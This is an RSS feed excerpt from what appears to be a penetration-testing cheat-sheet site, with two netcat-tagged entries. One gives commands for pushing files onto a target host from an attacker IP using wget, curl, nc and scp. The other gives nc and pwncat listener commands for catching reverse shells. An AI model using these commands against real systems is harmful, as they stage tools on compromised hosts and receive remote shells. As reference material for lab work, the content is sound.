channel.title: Nc on TLDRBins
channel.description: Recent content in Nc on TLDRBins

item.title: File Transfer (Linux To Linux)
item.description: HTTP # Start a local HTTP server python3 -m http.server 80 # wget wget http://10.10.14.10/file # curl curl http://10.10.14.10/file -o /tmp/file nc # In our local Linux machine nc -lvnp 4444 < file # In target Linux machine nc -w3 10.10.14.10 4444 > file scp Remote to Local # If you have target password scp user@10.10.11.10:/tmp/remote/file /tmp/local/file # If you have a ssh key scp -i id_rsa user@10.10.11.10:/tmp/remote/file /tmp/local/file Local to Remote # If you have target password scp /tmp/local/file user@10.

item.title: Listeners
item.description: nc rlwrap nc -lvnp 1337 pwncat Download pwncat pwncat-cs -lp 1337 #After getting a connection (local) pwncat$ back
